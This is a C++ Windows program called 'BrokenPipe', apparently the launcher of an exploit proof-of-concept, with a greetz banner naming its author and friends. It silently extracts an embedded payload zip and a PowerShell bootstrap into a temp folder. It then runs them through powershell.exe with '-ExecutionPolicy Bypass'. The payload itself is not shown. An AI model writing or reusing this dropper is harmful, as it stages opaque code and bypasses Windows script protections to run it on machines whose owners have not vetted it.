#include <windows.h>

#include <filesystem>
#include <iostream>
#include <string>
#include <vector>

#include "resource.h"

namespace {

struct temp_root_t {
    std::filesystem::path path;

    ~temp_root_t() {
        std::error_code error;
        std::filesystem::remove_all(path, error);
    }
};

std::wstring quote_argument(const std::wstring& value) {
    std::wstring result = L"\"";
    std::size_t slashes = 0;
    for (const wchar_t character : value) {
        if (character == L'\\') {
            ++slashes;
            continue;
        }
        if (character == L'\"') {
            result.append((slashes * 2) + 1, L'\\');
            result.push_back(L'\"');
            slashes = 0;
            continue;
        }
        result.append(slashes, L'\\');
        slashes = 0;
        result.push_back(character);
    }
    result.append(slashes * 2, L'\\');
    result.push_back(L'\"');
    return result;
}

std::filesystem::path create_temp_root() {
    std::vector<wchar_t> buffer(MAX_PATH + 1);
    const DWORD length = GetTempPathW(static_cast<DWORD>(buffer.size()), buffer.data());
    if (length == 0 || length >= buffer.size()) {
        throw std::runtime_error("Could not resolve the temp directory.");
    }

    wchar_t temporary_file[MAX_PATH + 1]{};
    if (GetTempFileNameW(buffer.data(), L"SLT", 0, temporary_file) == 0) {
        throw std::runtime_error("Could not reserve temp path.");
    }
    if (!DeleteFileW(temporary_file) || !CreateDirectoryW(temporary_file, nullptr)) {
        DeleteFileW(temporary_file);
        throw std::runtime_error("Could not create the temp workspace.");
    }
    return temporary_file;
}

void extract_resource(const int resource_id, const std::filesystem::path& destination) {
    const HRSRC resource = FindResourceW(nullptr, MAKEINTRESOURCEW(resource_id), RT_RCDATA);
    if (resource == nullptr) {
        throw std::runtime_error("Embedded resource is missing.");
    }
    const HGLOBAL loaded = LoadResource(nullptr, resource);
    const DWORD size = SizeofResource(nullptr, resource);
    const void* bytes = LockResource(loaded);
    if (loaded == nullptr || size == 0 || bytes == nullptr) {
        throw std::runtime_error("Embedded resource is unreadable.");
    }

    const HANDLE file = CreateFileW(
        destination.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_NEW,
        FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED, nullptr);
    if (file == INVALID_HANDLE_VALUE) {
        throw std::runtime_error("Could not create an extracted resource.");
    }

    DWORD written = 0;
    const BOOL write_ok = WriteFile(file, bytes, size, &written, nullptr);
    const BOOL flush_ok = FlushFileBuffers(file);
    CloseHandle(file);
    if (!write_ok || !flush_ok || written != size) {
        DeleteFileW(destination.c_str());
        throw std::runtime_error("Could not write embedded resource completely.");
    }
}

int run_bootstrap(
    const std::filesystem::path& bootstrap,
    const std::filesystem::path& payload,
    const std::filesystem::path& extract_root) {
    wchar_t windows_directory[MAX_PATH + 1]{};
    const UINT windows_length = GetWindowsDirectoryW(windows_directory, MAX_PATH + 1);
    if (windows_length == 0 || windows_length > MAX_PATH) {
        throw std::runtime_error("Windows directory could not be resolved.");
    }
    const std::filesystem::path powershell =
        std::filesystem::path(windows_directory) /
        L"System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    if (!std::filesystem::is_regular_file(powershell)) {
        throw std::runtime_error("PowerShell was not found.");
    }

    std::wstring command_line = quote_argument(powershell.wstring());
    command_line += L" -NoProfile -ExecutionPolicy Bypass -File ";
    command_line += quote_argument(bootstrap.wstring());
    command_line += L" -PayloadZip ";
    command_line += quote_argument(payload.wstring());
    command_line += L" -ExtractRoot ";
    command_line += quote_argument(extract_root.wstring());

    STARTUPINFOW startup{};
    startup.cb = sizeof(startup);
    PROCESS_INFORMATION process{};
    if (!CreateProcessW(
            powershell.c_str(), command_line.data(), nullptr, nullptr, TRUE, 0,
            nullptr, nullptr, &startup, &process)) {
        throw std::runtime_error("Could not start the embedded controller.");
    }

    CloseHandle(process.hThread);
    const DWORD wait = WaitForSingleObject(process.hProcess, INFINITE);
    DWORD exit_code = 1;
    if (wait != WAIT_OBJECT_0 || !GetExitCodeProcess(process.hProcess, &exit_code)) {
        CloseHandle(process.hProcess);
        throw std::runtime_error("Could not observe the embedded controller exit.");
    }
    CloseHandle(process.hProcess);
    return static_cast<int>(exit_code);
}

}  // namespace

int wmain() {
    try {
        std::wcout << L"BrokenPipe - by @Killa\n"
                      L"Greetz to (NIGHTMARE ECLIPSE/INFINITE NIGHTMARE/@MSNightmare2000), PLEASE HIRE HIM!\n\n"
                      L"Shoutout to Tookie, Hazetick, belogen and Nehsam\n"
                      L"MUEZZA GET WELL SOON\n"
                      L"MUEZZA GET WELL SOON\n"
                      L"MUEZZA GET WELL SOON\n"
                      L"thanks bet3rd for the tiktoks, you da best :3\n\n\n"
                      L"and hey, lusilly, you still owe me a Overwatch gaming session ;)\n\n"
                   << std::flush;

        temp_root_t temporary{create_temp_root()};
        const auto payload = temporary.path / L"BrokenPipePayload.zip";
        const auto bootstrap = temporary.path / L"BrokenPipe-Bootstrap.ps1";
        const auto extract_root = temporary.path / L"package";
        if (!CreateDirectoryW(extract_root.c_str(), nullptr)) {
            throw std::runtime_error("Could not create the package workspace.");
        }

        extract_resource(IDR_BrokenPipe_PAYLOAD, payload);
        extract_resource(IDR_BrokenPipe_BOOTSTRAP, bootstrap);
        return run_bootstrap(bootstrap, payload, extract_root);
    } catch (const std::exception& error) {
        std::cerr << "BrokenPipe failed: " << error.what() << '\n';
        return 1;
    }
}
